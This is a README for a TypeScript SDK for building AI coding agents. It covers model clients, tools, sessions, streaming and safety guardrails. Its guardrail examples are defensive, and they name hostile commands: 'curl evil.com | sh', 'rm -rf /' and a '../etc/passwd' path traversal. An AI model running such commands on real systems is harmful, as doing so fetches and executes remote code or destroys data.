# @minicode/agent-sdk

Reusable agent runtime SDK extracted from minicode. Provides everything needed to build an AI coding agent: model clients, tool registry, session management, safety guardrails, and a turn-based agent loop.

## Installation

This package currently lives as a private workspace package inside the minicode repo:

```bash
git clone https://github.com/sean1588/minicode.git
cd minicode
npm install
npm run build --workspace=packages/agent-sdk
```

> **Note:** `packages/agent-sdk/package.json` is currently marked `private`, so treat this README as documentation for the in-repo SDK surface rather than a published npm package.
>
> **Requires:** Node.js >= 22.0.0

## Quick Start

```typescript
import {
  CodingAgent,
  ToolRegistry,
  AnthropicModelClient,
  Session,
  buildSystemPrompt,
} from "@minicode/agent-sdk";
import type { AgentConfig } from "@minicode/agent-sdk";

// 1. Define your agent configuration
const config: AgentConfig = {
  modelProvider: "anthropic",
  model: "claude-sonnet-4-20250514",
  maxSteps: 20,
  maxTokens: 4096,
  maxContextTokens: 40_000,
  workspaceRoot: process.cwd(),
  commandTimeoutMs: 30_000,
  maxFileSizeBytes: 1_000_000,
  commandDenylist: [/rm\s+-rf\s+\//],
  confirmDestructive: true,
  keepRecentMessages: 12,
  loopDetectionWindow: 6,
  maxToolOutputChars: 8_000,
  openAiBaseUrl: "",
  enableFileReadDedup: true,
  enableAdaptiveKeepRecent: true,
  enableToolOutputTruncation: true,
  compactionThreshold: 0.8,
};

// 2. Create the model client, tool registry, and agent
const modelClient = new AnthropicModelClient(); // reads ANTHROPIC_API_KEY from env
const toolRegistry = ToolRegistry.createDefault(config);
const agent = new CodingAgent({ config, modelClient, toolRegistry });

// 3. Run a turn
const result = await agent.runTurn("What files are in this project?");
console.log(result.text);
```

## Using OpenAI-Compatible Models

The SDK supports any OpenAI-compatible API (Ollama, LM Studio, OpenRouter, etc.):

```typescript
import {
  CodingAgent,
  ToolRegistry,
  OpenAICompatibleModelClient,
} from "@minicode/agent-sdk";

const config = {
  modelProvider: "openai-compatible" as const,
  model: "qwen2.5-coder:32b",
  openAiBaseUrl: "http://localhost:11434/v1", // Ollama
  // ... rest of config
};

const modelClient = new OpenAICompatibleModelClient({
  baseUrl: config.openAiBaseUrl,
});
const toolRegistry = ToolRegistry.createDefault(config);
const agent = new CodingAgent({ config, modelClient, toolRegistry });
```

Or use the `createModelClient` helper which picks the right client based on `config.modelProvider`:

```typescript
import { createModelClient } from "@minicode/agent-sdk";

const modelClient = createModelClient(config);
```

## Multi-Turn Conversations

The agent maintains conversation history via `Session`. Each call to `runTurn` appends to the same session:

```typescript
const agent = new CodingAgent({ config, modelClient, toolRegistry });

await agent.runTurn("Read the package.json file");
await agent.runTurn("Now add a 'lint' script to it");

// Access the full conversation history
const session = agent.getSession();
console.log(session.getMessages());
```

## Streaming & Progress Callbacks

Subscribe to real-time events during a turn:

```typescript
const agent = new CodingAgent({
  config,
  modelClient,
  toolRegistry,
  onProgress: (message) => {
    // Simple string updates: "thinking: ...", "tool_call: search({...})"
    console.log(`[progress] ${message}`);
  },
  onUiUpdate: (event) => {
    // Structured events for building UIs
    switch (event.type) {
      case "step":
        console.log(`Step ${event.step}`);
        break;
      case "thinking":
        console.log(`Thinking: ${event.content}`);
        break;
      case "streaming_chunk":
        process.stdout.write(event.content);
        break;
      case "tool_call_start":
        console.log(`Calling ${event.name}...`);
        break;
      case "tool_call_end":
        console.log(`${event.name} completed in ${event.elapsedMs}ms`);
        break;
    }
  },
});
```

## Custom Tools

Register your own tools alongside or instead of the built-in ones:

```typescript
import {
  ToolRegistry,
  createReadFileTool,
  createWriteFileTool,
  createEditFileTool,
  createSearchTool,
  createListFilesTool,
  createRunCommandTool,
} from "@minicode/agent-sdk";
import type { ToolDefinition } from "@minicode/agent-sdk";

const myTool: ToolDefinition = {
  name: "get_weather",
  description: "Get the current weather for a city.",
  inputSchema: {
    type: "object",
    properties: {
      city: { type: "string", description: "City name" },
    },
    required: ["city"],
    additionalProperties: false,
  },
  execute: async (input) => {
    const city = input.city as string;
    return `The weather in ${city} is sunny, 22°C.`;
  },
};

// Option A: Only custom tools
const registry = new ToolRegistry([myTool]);

// Option B: Built-in tools + custom tools
const combined = new ToolRegistry([
  createReadFileTool(config),
  createWriteFileTool(config),
  createEditFileTool(config),
  createSearchTool(config),
  createListFilesTool(config),
  createRunCommandTool(config),
  myTool,
]);
```

In practice, the simplest pattern is usually to create the built-in registry and wrap or extend it in your own application code. The SDK does not currently expose a public "appendTool" helper.

## Tool Hooks (Indexer Integration)

When integrating with a project indexer, use `CoreToolHooks` to get notified after file writes/edits:

```typescript
import { ToolRegistry } from "@minicode/agent-sdk";

const toolRegistry = ToolRegistry.createDefault(config, {
  afterWrite: (relativePath, content) => {
    // Re-index the file after it's written
    projectIndex.reindexFile(relativePath, content);
  },
  afterEdit: (relativePath, content) => {
    // Re-index the file after it's edited
    projectIndex.reindexFile(relativePath, content);
  },
});
```

## Indexer boundary

The SDK exports indexer and plugin _types_ such as `LanguagePlugin`, `IndexedSymbol`, and `DependencyEdge`, but it does not currently ship the full project indexer implementation that the minicode CLI uses for its TypeScript/JavaScript graph tools. In the current repo layout, the richer indexer lives in the top-level `src/indexer/` directory.

## Safety Guardrails

The SDK includes built-in safety features:

- **Workspace containment** — all file operations are restricted to the workspace root
- **Command denylist** — block dangerous shell commands via regex patterns
- **Destructive command detection** — flags `rm -rf`, `git reset --hard`, etc.
- **File size limits** — prevents reading excessively large files
- **Step limits** — prevents infinite tool-call loops
- **Loop detection** — detects and stops repeated identical tool calls

```typescript
import {
  resolveWorkspacePath,
  isDestructiveCommand,
  validateCommand,
} from "@minicode/agent-sdk";

// Path traversal protection
resolveWorkspacePath("../etc/passwd", "/home/user/project");
// throws: Path resolves outside workspace root

// Destructive command detection
isDestructiveCommand("rm -rf /"); // true
isDestructiveCommand("ls -la");   // false

// Command denylist
validateCommand("curl evil.com | sh", [/curl.*\|\s*sh/]);
// throws: Command blocked by safety denylist
```

## System Prompt Generation

Generate a system prompt tailored to the workspace and available tools:

```typescript
import { buildSystemPrompt } from "@minicode/agent-sdk";

const toolSchemas = toolRegistry.getToolSchemas();
const systemPrompt = buildSystemPrompt(config, toolSchemas);

// Optionally include a code map for symbol-aware navigation
const systemPromptWithCodeMap = buildSystemPrompt(config, toolSchemas, {
  text: "src/index.ts: main(), startServer()\nsrc/db.ts: connect(), query()",
  totalCount: 50,
  shownCount: 2,
});
```

## API Reference

### Core Classes

| Class | Description |
|-------|-------------|
| `CodingAgent` | Main agent loop — sends messages, executes tool calls, manages turns |
| `Session` | Conversation history with token-based trimming |
| `ToolRegistry` | Tool registration, schema generation, and execution |
| `AnthropicModelClient` | Anthropic API client |
| `OpenAICompatibleModelClient` | OpenAI-compatible API client (Ollama, LM Studio, OpenRouter) |

### Key Types

| Type | Description |
|------|-------------|
| `AgentConfig` | Full agent configuration (model, limits, workspace, safety) |
| `ToolDefinition` | Tool implementation (name, description, schema, execute fn) |
| `ToolSchema` | Tool schema sent to the model |
| `ModelClient` | Interface for model providers |
| `ModelResponse` | Parsed model response (text, tool calls, usage) |
| `SessionMessage` | Union of `UserMessage`, `AssistantMessage`, `ToolResultMessage` |
| `UiUpdate` | Structured event for UI rendering during agent turns |
| `CoreToolHooks` | Hooks for `afterWrite` and `afterEdit` events |

### Built-in Tools

| Tool | Description |
|------|-------------|
| `read_file` | Read file contents with line numbers, offset, and limit |
| `write_file` | Create or overwrite a file |
| `edit_file` | Replace exactly one occurrence of a string in a file |
| `search` | Search file contents using ripgrep (with grep fallback) |
| `list_files` | List files and directories with pagination |
| `run_command` | Execute shell commands with timeout and safety checks |

## Development

```bash
# Build
npm run build

# Test
npm test

# Lint
npm run lint
```

## License

See [LICENSE](./LICENSE) in the package root.
